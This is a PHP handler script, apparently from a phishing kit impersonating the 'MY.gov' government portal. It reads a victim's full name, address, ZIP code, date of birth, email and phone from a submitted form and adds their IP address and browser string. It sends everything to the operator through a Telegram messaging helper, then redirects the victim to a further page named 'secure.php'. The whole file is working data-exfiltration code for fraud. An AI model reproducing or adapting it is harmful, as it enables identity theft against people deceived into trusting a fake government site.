<?php
include("config/config.php");
//Server Variables
    $ip = getenv("REMOTE_ADDR");
            $browser = $_SERVER['HTTP_USER_AGENT'];
        $adddate=date("D M d, Y g:i a");
    //Name Attributes of HTML FORM

    //Fetching HTML Values
    $fullName = $_POST['fullName'];
    $address = $_POST['address'];
    $zip = $_POST['zip'];
    $dob = $_POST['dob'];
    $emailAddr = $_POST['emailAddr'];
    $phone = $_POST['phone'];
    $serv = $_REQUEST['info'];


        //Telegram send
        $message = "**MY.gov-INFO\n";
        $message .= "User-!P : ".$ip."\n";   
        $message .= "----------------------------------------\n";
        $message .= "FULL NAME: ".$_POST['fullName']."\n";
        $message .= "----------------------------------------\n";
        $message .= "ADDRESS: ".$_POST['address']."\n";
        $message .= "----------------------------------------\n";
        $message .= "ZIP: ".$_POST['zip']."\n";
        $message .= "----------------------------------------\n";
        $message .= "DOB: ".$_POST['dob']."\n";
        $message .= "----------------------------------------\n";
        $message .= "EMAIL: ".$_POST['emailAddr']."\n";
        $message .= "----------------------------------------\n";
        $message .= "PHONE: ".$_POST['phone']."\n";
        $message .= "----------------------------------------\n";
        $message .= "User-Agent: ".$browser."\n";
        $message .= "----------------------------------------\n";
        $message .= "Date : $adddate\n";
        send_telegram_msg($message);



        //Output
        header("location:secure.php");
?>
